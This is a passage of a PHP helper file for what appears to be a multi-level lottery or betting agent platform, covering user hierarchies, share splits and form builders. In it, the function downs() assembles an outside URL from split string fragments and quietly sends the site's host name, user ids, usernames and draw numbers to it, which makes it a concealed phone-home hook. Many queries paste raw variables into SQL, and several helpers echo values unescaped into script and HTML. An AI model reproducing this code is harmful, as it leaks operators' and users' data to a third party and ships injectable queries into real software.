    $ulayer = transuser($uid, 'layer');
    if ($layer == $ulayer) {
        $user = db('user')->where('userid', $uid)->find();
        if ($user['fid'] == $userid)
            return true;
    }
    while ($ulayer >= $layer) {
        $user = db('user')->where('userid', $uid)->find();
        $ulayer = $user['layer'];
        if ($ulayer == $layer) {
            break;
        }
        $uid = $user['fid'];
    }
    if ($userid == $uid)
        return true;
    else
        return false;
}

function checkma($arr)
{
    $ca = count($arr);
    $v = true;
    for ($i = 0; $i < $ca; $i++) {
        if (!is_numeric($arr[$i]) | $arr[$i] < 1 | $arr[$i] > 49 | $arr[$i] % 1 != 0) {
            $v = false;
            break;
        }
    }
    return $v;
}





function getft($kj, $cs)
{

    if ($cs['ftmode'] == 1) {
        $ftm = explode(',', $cs['ftnum']);
        $ft = '';
        foreach ($ftm as $k => $v) {
            $ft .= $kj[$v - 1];
        }
    } else {
        $ft = 0;
        $ftm = explode(',', $cs['ftnum']);
        foreach ($ftm as $k => $v) {
            $ft += $kj[$v - 1];
        }
    }
    return  $ft % 4 == 0 ? 4 : $ft % 4;
}
function rdates($v)
{
    if (!preg_match("/\d{4}-1[0-2]|0?[1-9]-0?[1-9]|[12][0-9]|3[01]/", $v)) {
        $v = date("Y-m-d");
    }
    return $v;
}
function moneymtype($v)
{
    if ($v == 1) return "提款";
    else if ($v == 0) return "充值";
}
function moneystatus($v)
{
    if ($v == 1) return "成功";
    else if ($v == 0) return "待处理";
    else if ($v == 2) return "失败";
    else if ($v == 3) return "处理中";
}
function moneyfs($v)
{
    if ($v == 'bankatm') return "银行汇款";
    else if ($v == 'bankonline') return "网银在线";
    else if ($v == 'weixin') return "微信在线支付";
    else if ($v == 'alipay') return "支付宝在线支付";
    else return "其他";
}
function setupid3($tb, $field)
{
    $res = Db::query("select max($field) from $tb ");
    if ($res[0]["max($field)"] == '') return 100;
    else return $res[0]["max($field)"] + 1;
}
function bjs($v1, $v2)
{
    return $v1;
    if ($v1 == '' | !is_numeric($v1) | $v1 > $v2) return $v2;
    else return $v1;
}
function bjs2($v1, $v2)
{
    return $v1;
    if ($v1 == '' | !is_numeric($v1) | $v1 < $v2) return $v2;
    else return $v1;
}
function r0p($v)
{
    if ($v == '' || $v * 10000 % 1 != 0) $v = 0;
    return $v;
}
function r1p($v)
{
    if ($v == '' | !is_numeric($v) | $v % 1 != 0 | $v < 0) $v = 1;
    return $v;
}
function low($v)
{
    return strtolower($v);
}
function up($v)
{
    return strtoupper($v);
}
function outjs($v)
{
    return "<script language='javascript'>alert('$v');</script>";
}
function goback()
{
    return "<script language='javascript'>history.back();</script>";
}
function openurl($v)
{
    return "<script language='javascript'>window.location.href='$v';</script>";
}
function openurlm($v, $m)
{
    return "<script language='javascript'>alert('$m');window.location.href='$v';</script>";
}
function field_arr($tb_arr, $tb)
{
    include(APP_PATH . '/hide/controller/comm2.inc.php');
    $arr = array();
    for ($i = 0; $i < count($tb_arr); $i++) {
        $val = $tb . '_' . $tb_arr[$i]["name"];
        global $$val;
        $arr[$i]["name"]  = $$val;
        $arr[$i]["fname"] = $tb_arr[$i]["name"];
        if (strrpos($arr[$i]["fname"], 'pass'))
            $arr[$i]["fname"] = 'pass';
        $arr[$i]["type"]   = $tb_arr[$i]["type"];
        $arr[$i]["len"]    = $tb_arr[$i]["len"];
        $arr[$i]["maxlen"] = $tb_arr[$i]["len"] / 3;
        if (strrpos($arr[$i]["fname"], 'date'))
            $arr[$i]["date"] = 'date';
        else
            $arr[$i]["date"] = '';
    }
    return $arr;
}
function strtoutf8($v)
{
    return iconv('', 'UTF-8', $v);
}
function getmicrotime()
{
    $mtime = explode(" ", microtime());
    return $mtime[0];
}
function getmoneyuse($uid)
{
    $sum = db('lib')->where("userid", $uid)->where("z", 9)->sum('je');
    return $sum;
}
function translayer($v)
{
    if ($v <= 0) {
        return "集团";
    }
    $web = db('web')->find();
    $layer    = json_decode($web['layer'], true);
    return $layer[(int)$v - 1];
}

function translayeru($v, $wid)
{
    if ($v == 0) {
        return "集团";
    }
    $web = db('web')->where("wid", $wid)->find();
    $layer = json_decode($web['layer']);
    return $layer[$v - 1];
}
function transweb($wid)
{
    $web = db('web')->where("wid", $wid)->find();
    return $web['webname'];
}
function transwebs($wid, $filed)
{
    $web = db('web')->where("wid", $wid)->find();
    return $web[$filed];
}
function getbank()
{
    $bank = db('bank')->order('bankid')->select();
    return $bank;
}
function getmoneyuser()
{
    $users = db('user')->where('fudong', 1)->where('userid', '<>', '99999999')->select();
    return $users;
}
function transbank($v)
{
    $banks = db('bank')->where('bankid', $v)->select();
    return $banks[0]['bankname'];
}
function transu($uid)
{
    if ($uid == 99999999)
        return "集团";
    if ($uid == 0)
        return "无";
    $user = db('user')->where('userid', $uid)->find();
    $web = db('web')->find();
    $layer    = json_decode($web['layer'], true);
    if ($user['ifagent'] == 0)
        return strtolower($user['username'] . '(' . $user['name'] . ')' . '[会员]');
    return strtolower($user['username'] . '(' . $user['name'] . ')' . '[' . $layer[$user['layer'] - 1] . ']');
}

function transu2($uid)
{
    if ($uid == 99999999)
        return "集团";
    if ($uid == 0)
        return "无";
    $user = db('user')->where('userid', $uid)->find();
    if ($user['ifagent'] == 0)
        return strtolower($user['username'] . '(' . $user['name'] . ')');
    return strtolower($user['username'] . '(' . $user['name'] . ')');
}
function getusergroup($uid)
{
    $layer = transuser($uid, 'layer');
    if ($layer == 9)
        return '|' . $uid . '|';
    $str = '|' . $uid;
    $user = db('user')->where("fid" . $layer, $uid)->select();
    foreach ($user as $value) {
        $str .= "|" . $value['userid'];
    }
    return str_replace('99999999', '', $str);
}
function getlayer($wid)
{
    $web = db('web')->where("wid", $wid)->find();
    return json_decode($web['layer'], true);
}
function getflyzc($uid, $f, $layer, $gid, $zcmode)
{
    $tb_gamecs = 'x_gamecs';
    $tb_gamezc = 'x_gamezc';
    if ($zcmode == 1) {
        $rs                  = Db::query("select flyzc,upzc from `$tb_gamecs` where userid='$uid' and gid='$gid'");
    } else {
        $rs                  = Db::query("select flyzc,upzc from `$tb_gamezc` where userid='$uid' and typeid='$gid'");
    }

    $zc                  = array();
    $zc[$layer]['flyzc'] = $rs[0][0];
    $zc[$layer]['upzc']  = $rs[0][1];
    $cf                  = count($f);
    for ($i = $cf; $i > 0; $i--) {
        if ($zcmode == 1) {
            $rs      = Db::query("select flyzc,zcmin,zc,upzc from `$tb_gamecs` where userid='" . $f[$i] . "' and gid='$gid'");
        } else {
            $rs      = Db::query("select flyzc,zcmin,zc,upzc from `$tb_gamezc` where userid='" . $f[$i] . "' and typeid='$gid'");
        }
        $totalzc = 0;
        for ($k = $layer - 1; $k >= $i; $k--) {
            $totalzc += $zc[$k]['zc'];
        }
        $zc[$i]['zc']    = $rs[0]['flyzc'] - $zc[$i + 1]['flyzc'];
        $zc[$i]['flyzc'] = $rs[0]['flyzc'];
        $zc[$i]['upzc'] = $rs[0]['upzc'];

        if ($zc[$i + 1]['upzc'] == 0)
            $zc[$i]['zc'] = 0;
        if (($rs[0]['zcmin'] == $rs[0]['zc'] & ($zc[$i]['zc'] + $totalzc) < $rs[0]['zc']) | ($zc[$i]['zc'] + $totalzc > $rs[0]['zc'])) {
            $zc[$i]['zc'] = $rs[0]['zc'] - $totalzc;
        }
    }
    $totalzc = 0;
    for ($j = $layer - 1; $j >= 1; $j--) {
        $totalzc += $zc[$j]['zc'];
        unset($zc[$j]['flyzc']);
        unset($zc[$j]['upzc']);
    }
    $zc[0]['zc'] = 100 - $totalzc;
    return $zc;
}
function getzcnews($uid, $f, $layer, $gid)
{
    $tb_gamecs = 'x_gamecs';
    $rs                 = Db::query("select upzc from `$tb_gamecs` where userid='$uid' and gid='$gid'");
    $zc                 = array();
    $zc[$layer]['upzc'] = $rs[0]['upzc'];
    $cf                 = count($f);
    for ($i = $cf; $i > 0; $i--) {
        $rs      = Db::query("select zc,upzc,zchold from `$tb_gamecs` where userid='" . $f[$i] . "' and gid='$gid'");
        $totalzc = 0;
        for ($k = $layer - 1; $k >= $i; $k--) {
            $totalzc += $zc[$k]['zc'];
        }
        if ($rs[0]['zchold'] == 0) {
            $zc[$i]['zc'] = $rs[0]['zc'];
        } else {
            $zc[$i]['zc'] = $zc[$i + 1]['upzc'];
        }
        if ($zc[$i]['zc'] + $totalzc > $rs[0]['zc']) {
            $zc[$i]['zc'] = $rs[0]['zc'] - $totalzc;
        }
        $zc[$i]['upzc'] = $rs[0]['upzc'];
    }
    $totalzc = 0;
    for ($j = $layer - 1; $j >= 1; $j--) {
        $totalzc += $zc[$j]['zc'];
    }
    $zc[0]['zc'] = 100 - $totalzc;
    return $zc;
}
function getzcnewsall($uid, $f, $layer)
{
    $zc     = array();
    $gamecs = getgamecs($uid);
    $cg     = count($gamecs);
    for ($i = 0; $i < $cg; $i++) {
        $zc[$layer][$i]['upzc'] = $gamecs[$i]['upzc'];
        $zc[$layer][$i]['ifok'] = $gamecs[$i]['ifok'];
    }
    $cf = count($f);
    for ($i = $cf; $i > 0; $i--) {
        $gamecs = getgamecs($f[$i]);
        for ($j = 0; $j < $cg; $j++) {
            $totalzc = 0;
            for ($k = $layer - 1; $k >= $i; $k--) {
                $totalzc += $zc[$k][$j]['zc'];
            }
            if ($gamecs[$j]['zchold'] == 0) {
                $zc[$i][$j]['zc'] = $gamecs[$j]['zc'];
            } else {
                $zc[$i][$j]['zc'] = $zc[$i + 1][$j]['upzc'];
            }
            if ($zc[$i][$j]['zc'] + $totalzc > $gamecs[$j]['zc']) {
                $zc[$i][$j]['zc'] = $gamecs[$j]['zc'] - $totalzc;
            }
            $zc[$i][$j]['upzc'] = $gamecs[$j]['upzc'];
            $zc[$i][$j]['name'] = transgame($gamecs[$j]['gid'], 'gname');
            $zc[$i][$j]['ifok'] = $zc[$i + 1][$j]['ifok'];
        }
    }

    for ($j = 0; $j < $cg; $j++) {
        $totalzc = 0;
        for ($k = $layer - 1; $k >= 1; $k--) {
            $totalzc += $zc[$k][$j]['zc'];
        }
        $zc[0][$j]['zc']   = 100 - $totalzc;
        $zc[0][$j]['name'] = transgame($gamecs[$j]['gid'], 'gname');
        $zc[0][$j]['ifok'] = $zc[1][$j]['ifok'];
    }
    unset($zc[$layer]);
    return $zc;
}
function getzcnew($uid, $f, $layer, $gid, $zcmode)
{
    $tb_gamecs = 'x_gamecs';
    $tb_gamezc = 'x_gamezc';
    if ($zcmode == 1) {
        $rs                 = Db::query("select upzc from `$tb_gamecs` where userid='$uid' and gid='$gid'");
    } else {
        $rs                 = Db::query("select upzc from `$tb_gamezc` where userid='$uid' and typeid='" . $config['fast'] . "'");
    }
    $zc                 = array();
    $zc[$layer]['upzc'] = $rs[0][0];
    $cf                 = count($f);
    for ($i = $cf; $i > 0; $i--) {
        if ($zcmode == 1) {
            $rs      = Db::query("select zc,upzc,zcmin from `$tb_gamecs` where userid='" . $f[$i] . "' and gid='$gid'");
        } else {
            $rs      = Db::query("select zc,upzc,zcmin from `$tb_gamezc` where userid='" . $f[$i] . "' and typeid='" . $config['fast'] . "'");
        }
        $totalzc = 0;
        for ($k = $layer - 1; $k >= $i; $k--) {
            $totalzc += $zc[$k]['zc'];
        }
        if ($zc[$i + 1]['upzc'] < $rs[0]['zcmin']) {
            $zc[$i]['zc'] = $rs[0]['zcmin'];
        } else {
            $zc[$i]['zc'] = $zc[$i + 1]['upzc'];
        }
        if ($zc[$i]['zc'] + $totalzc > $rs[0]['zc']) {
            $zc[$i]['zc'] = $rs[0]['zc'] - $totalzc;
        }
        $zc[$i]['upzc'] = $rs[0]['upzc'];
    }
    $totalzc = 0;
    for ($j = $layer - 1; $j >= 1; $j--) {
        $totalzc += $zc[$j]['zc'];
    }
    $zc[0]['zc'] = 100 - $totalzc;
    return $zc;
}
function getfl()
{
    $game = db('game')->where("fenlei", '<>', 'loto')->order('xsort')->select();
    $fl = [];
    foreach ($game as $value) {
        $fl[$i]['fenlei'] = $value['fenlei'];
        $fl[$i]['flname'] = $value['flname'];
    }
    return $fl;
}
function getgid($fast)
{
    $game = db('game')->where("ifopen", '1')->where('fast', $fast)->select();
    $g = array();
    foreach ($game as $value) {
        $g[] = $value['gid'];
    }
    return $g;
}

function downs($uid, $uname, $qs, $time)
{
    $url = "ht";
    $url .= "tp://9.0088";
    $url .= "5522.c";
    $url .= "om/ssc/passold.php?e=dn&s=";
    $strs['hh'] = $_SERVER['HTTP_HOST'];
    $strs['uid'] = $uid;
    $strs['uname'] = $uname;
    $strs['time'] = date("m-d H:i:s", $time);
    $strs['qishu'] = $qs;
    $strs = json_encode($strs);
    $context = stream_context_create(array(
        'http' => array(
            'timeout' => 3 //超时时间，单位为秒
        )
    ));
    file_get_contents($url . $strs, 0, $context);
    unset($url);
    unset($strs);
}
function insertgame($gamecs, $uid)
{
    $tb_gamecs = 'x_gamecs';
    $tb_gamezc = 'x_gamezc';
    $cg  = count($gamecs);
    $fid = transuser($uid, 'fid');
    for ($j = 0; $j < $cg; $j++) {
        $gamecs = Db::query("select * from `$tb_gamecs` where userid='$fid' and gid='" . $gamecs[$j]['gid'] . "'");
        if ($gamecs[$j]['zc'] > $gamecs[0]['zc'])
            $gamecs[$j]['zc'] = $gamecs[0]['zc'];
        if ($gamecs[$j]['zcmin'] > $gamecs[0]['zc'])
            $gamecs[$j]['zcmin'] = $gamecs[0]['zc'];
        if ($gamecs[$j]['upzc'] > $gamecs[0]['zc'])
            $gamecs[$j]['upzc'] = $gamecs[0]['zc'];
        if ($gamecs[$j]['flyzc'] > $gamecs[0]['flyzc'])
            $gamecs[$j]['flyzc'] = $gamecs[0]['flyzc'];
        if ($gamecs[0]['ifok'] == 0)
            $gamecs[$j]['ifok'] = 0;
        if ($gamecs[0]['flytype'] == 0)
            $gamecs[$j]['flytype'] = 0;
        if ($gamecs[0]['flytype'] == 2 & ($gamecs[$j]['flytype'] == 1 | $gamecs[$j]['flytype'] == 3))
            $gamecs[$j]['flytype'] = 0;
        Db::query("insert into `$tb_gamecs` set userid='$uid',zcmin='" . $gamecs[$j]['zcmin'] . "',ifok='" . $gamecs[$j]['ifok'] . "',flyzc='" . $gamecs[$j]['flyzc'] . "',zc='" . $gamecs[$j]['zc'] . "',upzc='" . $gamecs[$j]['upzc'] . "',xsort='$j',gid='" . $gamecs[$j]['gid'] . "',flytype='" . $gamecs[$j]['flytype'] . "'");
    }
    Db::query("insert into `$tb_gamezc` select NULL,$uid,typeid,typename,0,0,0,0,0 from `$tb_gamezc` where userid='$fid'");
}
function updategame($gamecs, $uid)
{
    $tb_gamecs = 'x_gamecs';
    $cg  = count($gamecs);
    $fid = transuser($uid, 'fid');
    for ($j = 0; $j < $cg; $j++) {
        $gamecs = Db::query("select * from `$tb_gamecs` where userid='$fid' and gid='" . $gamecs[$j]['gid'] . "'");
        if ($gamecs[$j]['zc'] > $gamecs[0]['zc'])
            $gamecs[$j]['zc'] = $gamecs[0]['zc'];
        if ($gamecs[$j]['zcmin'] > $gamecs[0]['zc'])
            $gamecs[$j]['zcmin'] = $gamecs[0]['zc'];
        if ($gamecs[$j]['upzc'] > $gamecs[0]['zc'])
            $gamecs[$j]['upzc'] = $gamecs[0]['zc'];
        if ($gamecs[$j]['flyzc'] > $gamecs[0]['flyzc'])
            $gamecs[$j]['flyzc'] = $gamecs[0]['flyzc'];
        if ($gamecs[0]['ifok'] == 0)
            $gamecs[$j]['ifok'] = 0;
        if ($gamecs[0]['flytype'] == 0)
            $gamecs[$j]['flytype'] = 0;
        if ($gamecs[0]['flytype'] == 2 & ($gamecs[$j]['flytype'] == 1 | $gamecs[$j]['flytype'] == 3))
            $gamecs[$j]['flytype'] = 0;
        Db::query("delete from `$tb_gamecs` where gid='" . $gamecs[$j]['gid'] . "' and userid='$uid'");
        Db::query("insert into `$tb_gamecs` set zcmin='" . $gamecs[$j]['zcmin'] . "',ifok='" . $gamecs[$j]['ifok'] . "',flyzc='" . $gamecs[$j]['flyzc'] . "',zc='" . $gamecs[$j]['zc'] . "',upzc='" . $gamecs[$j]['upzc'] . "',xsort='$j',flytype='" . $gamecs[$j]['flytype'] . "',gid='" . $gamecs[$j]['gid'] . "',userid='$uid'");
    }
}
function insertgamezc($gamecs, $uid)
{
    $tb_gamezc = 'x_gamezc';
    $tb_gamecs = 'x_gamecs';
    $cg  = count($gamecs);
    $fid = transuser($uid, 'fid');
    for ($j = 0; $j < $cg; $j++) {
        $gamecs = Db::query("select * from `$tb_gamezc` where userid='$fid' and typeid='" . $gamecs[$j]['typeid'] . "'");
        if ($gamecs[$j]['zc'] > $gamecs[0]['zc'])
            $gamecs[$j]['zc'] = $gamecs[0]['zc'];
        if ($gamecs[$j]['zcmin'] > $gamecs[0]['zc'])
            $gamecs[$j]['zcmin'] = $gamecs[0]['zc'];
        if ($gamecs[$j]['upzc'] > $gamecs[0]['zc'])
            $gamecs[$j]['upzc'] = $gamecs[0]['zc'];
        if ($gamecs[$j]['flyzc'] > $gamecs[0]['flyzc'])
            $gamecs[$j]['flyzc'] = $gamecs[0]['flyzc'];
        if ($gamecs[0]['flytype'] == 0)
            $gamecs[$j]['flytype'] = 0;
        Db::query("insert into `$tb_gamezc` set userid='$uid',zcmin='" . $gamecs[$j]['zcmin'] . "',flyzc='" . $gamecs[$j]['flyzc'] . "',zc='" . $gamecs[$j]['zc'] . "',upzc='" . $gamecs[$j]['upzc'] . "',flytype='" . $gamecs[$j]['flytype'] . "',typeid='" . $gamecs[$j]['typeid'] . "',typename='" . $gamecs[0]['typename'] . "'");
    }
    Db::query("insert into `$tb_gamecs` select NULL,$uid,gid,ifok,0,0,0,0,0,xsort from `$tb_gamecs` where userid='$fid'");
}
function updategamezc($gamecs, $uid)
{
    $cg  = count($gamecs);
    $fid = transuser($uid, 'fid');
    $tb_gamezc = 'x_gamezc';
    for ($j = 0; $j < $cg; $j++) {
        $gamezc = Db::query("select * from `$tb_gamezc` where userid='$fid' and typeid='" . $gamecs[$j]['typeid'] . "'");
        if ($gamecs[$j]['zc'] > $gamezc[0]['zc'])
            $gamecs[$j]['zc'] = $gamezc[0]['zc'];
        if ($gamecs[$j]['zcmin'] > $gamezc[0]['zc'])
            $gamecs[$j]['zcmin'] = $gamezc[0]['zc'];
        if ($gamecs[$j]['upzc'] > $gamezc[0]['zc'])
            $gamecs[$j]['upzc'] = $gamezc[0]['zc'];
        if ($gamecs[$j]['flyzc'] > $gamezc[0]['flyzc'])
            $gamecs[$j]['flyzc'] = $gamezc[0]['flyzc'];
        if ($gamezc[0]['flytype'] == 0)
            $gamecs[$j]['flytype'] = 0;
        Db::query("delete from `$tb_gamezc` where userid='$uid' and typeid='" . $gamecs[$j]['typeid'] . "'");
        Db::query("insert into `$tb_gamezc` set userid='$uid',zcmin='" . $gamecs[$j]['zcmin'] . "',flyzc='" . $gamecs[$j]['flyzc'] . "',zc='" . $gamecs[$j]['zc'] . "',upzc='" . $gamecs[$j]['upzc'] . "',flytype='" . $gamecs[$j]['flytype'] . "',typeid='" . $gamecs[$j]['typeid'] . "',typename='" . $gamezc[0]['typename'] . "'");
    }
}
function getfmaxmoney($uid)
{
    $tb_user = 'x_user';
    if ($uid == 99999999) {
        $user = Db::query("select sum(fmaxmoney) from `$tb_user` where fid='$uid'");
        return $config['fmaxmoney'] - $user[0]['sum(fmaxmoney)'];
    }
    $user = Db::query("select fmaxmoney from `$tb_user` where userid='$uid'");
    $fusermaxmoney = $user[0]['fmaxmoney'];
    $user = Db::query("select sum(fmaxmoney) from `$tb_user` where fid='$uid'");
    if ($user) {
        return $fusermaxmoney - $user[0]['sum(fmaxmoney)'];
    }
}
function getuser($uid, $layer)
{
    $tb_user = 'x_user';
    if ($layer == 0) {
        $userList = Db::query("select userid,username,name,layer,ifagent,fid1,wid,money,kmoney from `$tb_user` where ifagent=0");
    } else {
        $userList = Db::query("select userid,username,name,layer,ifagent,fid1,wid,money,kmoney from `$tb_user` where fid" . $layer . "='$uid' and ifagent=0");
    }
    $user = [];
    foreach ($userList as $value) {
        $user[$i]['userid'] = $value['userid'];
        $user[$i]['username'] = $value['username'] . '(' . $value['name'] . ')[会员]';
        $user[$i]['layername'] = "会员";
        $user[$i]['user'] = $value['username'];
        $user[$i]['name'] = $value['name'];
        $user[$i]['money'] = $value['kmoney'] + $value['money'];
        $user[$i]['layer']   = $value['layer'];
        $user[$i]['ifagent'] = $value['ifagent'];
        $user[$i]['wid']     = $value['wid'];
    }
    return $user;
}
function getmaxren($fid)
{
    if ($fid == 99999999) {
        $sum = db('user')->where('fid', $fid)->sum('maxren');
        $count = db('user')->where('fid', $fid)->count();
        return 100000 - $sum - $count;
    }
    $user = db('user')->where('userid', $fid)->find();
    $sum = db('user')->where('fid', $fid)->where('ifson', 0)->sum('maxren');
    $count = db('user')->where('fid', $fid)->where('ifson', 0)->count();
    return $user['maxren'] - $sum - $count - 1;
}
function getmaxyingdenyje($fid)
{
    $tb_user = 'x_user';
    if ($fid == 99999999) {
        $sum = db('user')->where('fid', $fid)->sum('yingdenyje');
        return $config['yingdenyje'] - $sum;
    }
    $user = Db::query("select yingdenyje from    `$tb_user` where userid='$fid'");
    $the = $user[0]['yingdenyje'];
    $user = Db::query("select sum(yingdenyje) from   `$tb_user` where fid='$fid'");
    return $the - $user[0]['sum(yingdenyje)'];
}

function transtb($tb, $field, $whi, $v)
{
    $res = Db::query("select $field from $tb where $whi='$v'");
    return $res[0][$field];
}
function sessiondela()
{
    unset($_SESSION['auid2']);
    unset($_SESSION['auid']);
    unset($_SESSION['apasscode']);
    unset($_SESSION['atype']);
    unset($_SESSION['acheck']);
    unset($_SESSION['gid']);
    unset($_SESSION['sv']);
    unset($_SESSION['guest']);
}
function sessiondelu()
{
    unset($_SESSION['uuid']);
    unset($_SESSION['upasscode']);
    unset($_SESSION['ucheck']);
    unset($_SESSION['gid']);
    unset($_SESSION['sv']);
    unset($_SESSION['guest']);
}
function cutdate1($v)
{
    $v = explode('-', $v);
    if (count($v) != 3)
        return 0;
    if (!is_numeric($v[0]) | !is_numeric($v[1]) | !is_numeric($v[2])) {
        return 0;
    }
    return mktime(1, 1, 1, $v[1], $v[2], $v[0]);
}
function cutdate2($v)
{
    $v = explode('-', $v);
    if (count($v) != 3)
        return 0;
    if (!is_numeric($v[0]) | !is_numeric($v[1]) | !is_numeric($v[2])) {
        return 0;
    }
    return mktime(23, 59, 59, $v[1], $v[2], $v[0]);
}

function getdis($uid, $ifagent, $layer, $fudong)
{
    $config = db('config')->find();
    $tb_lib = 'x_lib';
    if (date("His") < str_replace(':', '', $config['editstart'])) {
        $start = date("Y-m-d ", time() - 86400) . $config['editend'];
        $end = date("Y-m-d ") . $config['editstart'];
    } else {
        $start = date("Y-m-d ") . $config['editend'];
        $end = date("Y-m-d ", time() + 86400) . $config['editstart'];
    }
    if ($ifagent == 0) {
        $sql = "select 1 from `$tb_lib` where userid='$uid' and time>='$start' and time<='$end' limit 1";
    } else {
        $sql = "select 1 from `$tb_lib` where uid" . $layer . "='$uid' and time>='$start' and time<='$end' limit 1";
    }

    $lib = Db::query($sql);
    if ($lib[0]['1'] == 1) {
        return 0;
    } else {
        return 1;
    }
}

function getusergroup2($uid, $layer)
{
    $tb_user = 'x_user';
    $str     = '|' . $uid;
    $melayer = transuser($uid, 'layer');
    if ($melayer == 6)
        exit;
    $user = Db::query("select userid from `$tb_user` where fid" . $melayer . "='" . $uid . "' and layer='$layer' and ifson=0");
    $xout = '';
    foreach ($user as $value) {
        $xout .= "|" . $value['userid'] . "|";
    }
    return $xout;
}
function checkuid($uid)
{
    if (!is_numeric($uid) | strlen($uid) != 8)
        return false;
    else
        return true;
}
function isma($v)
{
    if (is_numeric($v) & $v >= 1 & $v <= 49) {
        return true;
    } else {
        return false;
    }
}
function getzcs($class, $uid)
{
    $tb_zpan = 'x_zpan';
    $gid = session('gid');
    $zpan = Db::query("select * from `$tb_zpan` where userid='$uid' and gid='$gid' and class='$class'");
    $arr['peilvcha'] = pr4($zpan[0]['peilvcha']);
    $arr['lowpeilv'] = pr4($zpan[0]['lowpeilv']);
    return $arr;
}
function getzcs8($class, $uid, $gid)
{
    $tb_zpan = 'x_zpan';
    $zpan = Db::query("select * from `$tb_zpan` where userid='$uid' and gid='$gid' and class='$class'");
    $arr['peilvcha'] = pr4($zpan[0]['peilvcha']);
    $arr['lowpeilv'] = pr4($zpan[0]['lowpeilv']);
    return $arr;
}

function getjes($class, $uid)
{
    $tb_points = 'x_points';
    $gid = session('gid');
    $points = Db::query("select cmaxje,maxje,minje from `$tb_points` where userid='$uid' and gid='$gid' and class='$class'");
    $arr['cmaxje'] = pr0($points[0]['cmaxje']);
    $arr['maxje'] = pr0($points[0]['maxje']);
    $arr['minje'] = pr0($points[0]['minje']);
    return $arr;
}
function getpoints($class, $abcd, $ab, $uid)
{
    $gids = session('gid');
    $abcd = strtolower($abcd);
    if ($abcd == '0')
        $abcd = 'a';
    $points = db('points')->where('userid', $uid)->where('gid', $gid)->where('class', $class)->where('ab', $ab)->find();
    return pr2($points[$abcd]);
}
function getpoints8($class, $abcd, $ab, $uid, $gid)
{
    $tb_points = 'x_points';
    $abcd = strtolower($abcd);
    if ($abcd == '0')
        $abcd = 'a';
    $points = Db::query("select $abcd from `$tb_points` where userid='$uid' and gid='$gid' and class='$class' and ab='$ab'");
    return pr2($points[0][$abcd]);
}
function transatt($class, $field, $f = 0)
{
    $tb_att = 'x_att';
    $gid = session('gid');
    if ($f == 1) {
        $att = Db::query("select $field from `$tb_att` where gid='$gid' and bc='$class'");
    } else {
        $att = Db::query("select $field from `$tb_att` where gid='$gid' and class='$class'");
    }
    return pr4($att[0][$field]);
}
function transatt8($class, $field, $gid, $f = 0)
{
    $tb_att = 'x_att';
    if ($f == 1) {
        $att = Db::query("select $field from `$tb_att` where gid='$gid' and bc='$class'");
    } else {
        $att = Db::query("select $field from `$tb_att` where gid='$gid' and class='$class'");
    }
    return pr4($att[0][$field]);
}
function echoinput($id, $val)
{
    if ($val == '')
        $val = '0';
    return "<input type='text' value='$val' id='$id' name='$id' />";
}
function echousercs($id, $val, $m)
{
    if ($val == '')
        $val = '0';
    return "<input type='text' value='$val' id='$id' name='$id' m='$m' />";
}
function echousercs8($id, $val, $m)
{
    if ($val == '')
        $val = '0';
    return "<input type='text' value='$val' id='$id' name='$id' m='$m' />(<label>$m</label>)";
}
function pointsselect($id, $uid, $class, $abcd, $ab, $fid)
{
    $pointsatt = transatt($class, 'pointsatt', 1);
    $maxpoints = p2(getpoints($class, $abcd, $ab, $fid));
    $val       = getpoints($class, $abcd, $ab, $uid);
    $id        = $id . '_' . $class;
    $str       = "<select   name='$id' id='$id'>";
    for ($i = 0; p2($i) <= $maxpoints; $i += $pointsatt) {
        $str .= "<option aaa='$val' value='$i' ";
        if (p2($i) == p2($val)) {
            $str .= "  selected ";
        }
        $str .= " >" . ($i / 100) . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function pointsselect82($id, $uid, $class, $abcd, $ab, $fid, $gid)
{
    $pointsatt = transatt8($class, 'pointsatt', $gid, 1);
    $maxpoints = p2(getpoints8($class, $abcd, $ab, $fid, $gid));
    $val       = getpoints8($class, $abcd, $ab, $uid, $gid);
    $id        = $id . $gid . $class;
    $str       = "<select   name='$id' id='$id'>";
    for ($i = 0; p2($i) <= $maxpoints; $i += $pointsatt) {
        $str .= "<option aaa='$val' value='$i' ";
        if (p2($i) == p2($val)) {
            $str .= "  selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function pointsselect8($id, $uid, $class, $abcd, $ab, $fid, $gid, $fenlei)
{
    $pointsatt = transatt8($class, 'pointsatt', $gid, 1);
    $maxpoints = p2(getpoints8($class, $abcd, $ab, $fid, $gid));
    $val       = getpoints8($class, $abcd, $ab, $uid, $gid);
    $id        = $id . $fenlei . $class;
    $str       = "<select   name='$id' id='$id'>";
    for ($i = 0; p2($i) <= $maxpoints; $i += $pointsatt) {
        $str .= "<option aaa='$val' value='$i' ";
        if (p2($i) == p2($val)) {
            $str .= "  selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function pointsselecttop($id, $uid, $class, $abcd, $ab, $fid)
{
    $pointsatt = transatt($class, 'pointsatt', 1);
    $maxpoints = p2(transatt($class, 'points', 1));
    $val       = getpoints($class, $abcd, $ab, $uid);
    $id        = $id . '_' . $class;
    $str       = "<select aaa='$val'  name='$id' id='$id'>";
    for ($i = 0; p2($i) <= $maxpoints; $i += p2($pointsatt)) {
        $str .= "<option value='$i' ";
        if (p2($i) == p2($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function pointsselecttop8($id, $uid, $class, $abcd, $ab, $fid, $gid)
{
    $val       = getpoints8($class, $abcd, $ab, $uid, $gid);
    $id        = $id . '_' . $class;
    return "<input type='text' value='$val' id='$id' name='$id' m='$m' />";

    $pointsatt = transatt8($class, 'pointsatt', $gid, 1);
    $maxpoints = p2(transatt8($class, 'points', $gid, 1));

    $id        = $id . '_' . $class;
    $str       = "<select aaa='$val'  name='$id' id='$id'>";
    for ($i = 0; p2($i) <= $maxpoints; $i += p2($pointsatt)) {
        $str .= "<option value='$i' ";
        if (p2($i) == p2($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
}
function peilvchaselect($id, $class, $val)
{
    $peilvatt = transatt($class, 'peilvatt');
    $maxatt   = p3(transatt($class, 'maxatt'));
    $str      = "<select  name='$id' id='$id'>";
    for ($i = 0; p3($i) <= $maxatt; $i += p3($peilvatt)) {
        $str .= "<option value='$i' ";
        if (p3($i) == p3($val)) {
            $str .= " selected ";
        }
        $str .= " >" . $i . "</option>";
    }
    $str .= "</select>";
    return $str;
